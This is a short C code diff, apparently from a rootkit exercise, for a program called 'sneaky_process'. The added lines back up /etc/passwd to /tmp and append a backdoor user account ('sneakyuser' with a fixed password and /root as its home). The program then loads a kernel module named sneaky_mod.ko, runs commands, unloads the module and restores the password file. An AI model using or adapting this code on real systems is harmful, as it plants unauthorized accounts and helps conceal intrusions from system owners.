@@ -19,11 +19,19 @@ void execv_line() {
 
 int main() {
   printf("sneaky_process pid = %d\n", getpid());  // print pid
+
+  system("cp /etc/passwd /tmp");    // backup password
+
+  // insert new password
+  system("echo 'sneakyuser:abc123:2000:2000:sneakyuser:/root:bash' >> /etc/passwd");   
+  
   system("sudo insmod sneaky_mod.ko");  // load mod
 
   execv_line(); // execute terminal commands
   
   system("sudo rmmod sneaky_mod");     // un-load mod
+
+  system("cp /tmp/passwd /etc");   // password recover
   
   return EXIT_SUCCESS;
 }
